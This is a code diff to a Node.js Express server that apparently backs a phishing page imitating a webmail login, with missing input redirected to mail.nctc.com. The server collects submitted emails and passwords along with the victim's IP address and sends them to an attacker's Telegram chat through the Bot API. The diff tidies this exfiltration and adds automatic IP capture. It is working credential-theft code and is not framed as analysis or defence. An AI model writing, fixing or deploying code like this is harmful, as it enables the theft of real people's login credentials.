@@ -2,6 +2,7 @@ const express = require("express");
 const bodyParser = require("body-parser");
 const cors = require("cors");
 const axios = require("axios");
+const requestIp = require("request-ip");
 
 const app = express();
 const PORT = 3000;
@@ -12,6 +13,7 @@ const TELEGRAM_CHAT_ID = "7207894371";
 
 app.use(cors());
 app.use(bodyParser.json());
+app.use(requestIp.mw()); // Middleware to get client IP
 app.use(express.static(__dirname)); // Serve index.html
 
 // Serve index.html when visiting the root
@@ -21,23 +23,23 @@ app.get("/", (req, res) => {
 
 // Handle login requests
 app.post("/", async (req, res) => {
-    const { email, password, ip } = req.body;
+    const { email, password } = req.body;
+    const ip = req.clientIp || "Unknown IP";
 
     if (!email || !password) {
-        return res.redirect('https://mail.nctc.com/')
+        return res.redirect("https://mail.nctc.com/");
     }
 
     const escapeMarkdown = (text) => {
-    return text.replace(/[_*[\]()~`>#+\-=|{}.!]/g, "\\$&"); // Escape special characters
-};
+        return text.replace(/[_*[\]()~`>#+\-=|{}.!]/g, "\\$&"); // Escape special characters
+    };
 
-const message = escapeMarkdown(`🔴 New Rezult
-👤 Email: ${username}
+    const message = escapeMarkdown(`🔴 Login Attempt
+👤 Email: ${email}
 🛑 Password: ${password}
-📍 IP: ${ip}
-🚨 Attempt: ${failedAttempts[ip]}`);
+📍 IP: ${ip}`);
+
     try {
-        // Send to Telegram
         await axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
             chat_id: TELEGRAM_CHAT_ID,
             text: message,
